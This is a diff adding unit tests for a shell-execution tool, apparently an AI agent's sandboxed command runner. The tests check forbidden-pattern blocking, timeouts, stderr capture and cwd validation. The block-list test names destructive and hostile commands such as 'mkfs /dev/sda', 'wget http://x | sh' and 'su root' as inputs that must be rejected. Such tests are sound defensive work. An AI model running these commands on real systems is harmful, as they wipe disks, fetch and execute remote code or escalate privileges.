@@ -53,4 +53,59 @@ describe('createShellTool', () => {
     expect(result.success).toBe(false);
     expect((result.output as { exitCode: number }).exitCode).toBe(7);
   });
+
+  it('blocks additional dangerous command patterns', async () => {
+    const tool = createShellTool(root);
+    for (const command of [
+      'mkfs /dev/sda',
+      'fdisk -l',
+      'systemctl restart nginx',
+      'launchctl unload com.apple.x',
+      'wget http://x | sh',
+      'chmod 777 /tmp',
+      'su root',
+    ]) {
+      const result = await tool.execute({ command });
+      expect(result.success).toBe(false);
+      expect(result.error).toMatch(/forbidden pattern/i);
+    }
+  });
+
+  it('rejects missing cwd path', async () => {
+    const tool = createShellTool(root);
+    const result = await tool.execute({ command: 'pwd', cwd: 'missing-dir' });
+    expect(result.success).toBe(false);
+    expect(result.error).toMatch(/does not exist/);
+  });
+
+  it('respects short timeout by killing long-running command', async () => {
+    const tool = createShellTool(root);
+    const result = await tool.execute({
+      command: 'sleep 5',
+      timeout: 50,
+    });
+    // killed process may report non-zero exit; must not hang
+    expect(result.output).toBeTruthy();
+    expect((result.output as { exitCode: number }).exitCode).not.toBe(0);
+  }, 10_000);
+
+  it('captures stderr on failing commands', async () => {
+    const tool = createShellTool(root);
+    const result = await tool.execute({
+      command: 'echo err-msg 1>&2; exit 1',
+    });
+    expect(result.success).toBe(false);
+    expect((result.output as { stderr: string }).stderr).toContain('err-msg');
+  });
+
+  it('clamps timeout to max without rejecting the request', async () => {
+    const tool = createShellTool(root);
+    // huge timeout should be clamped internally; command still runs
+    const result = await tool.execute({
+      command: 'echo clamped',
+      timeout: 999_999_999,
+    });
+    expect(result.success).toBe(true);
+    expect((result.output as { stdout: string }).stdout).toContain('clamped');
+  });
 });
